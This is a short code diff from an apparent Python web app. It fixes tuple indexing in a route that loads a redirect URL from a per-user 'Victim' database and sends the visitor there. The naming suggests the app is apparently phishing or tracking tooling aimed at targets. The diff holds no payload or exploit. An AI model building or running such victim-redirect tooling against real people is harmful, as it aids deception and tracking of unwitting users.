@@ -61,7 +61,7 @@ def index():
                     username = username[0].replace(".html", "")
                     db_victim = Victim(f'./users/{username}/database.db')
                     url_redirect = db_victim.GetRedirect()
-                    return redirect(url_redirect[0])
+                    return redirect(url_redirect[0][0])
 
 
 
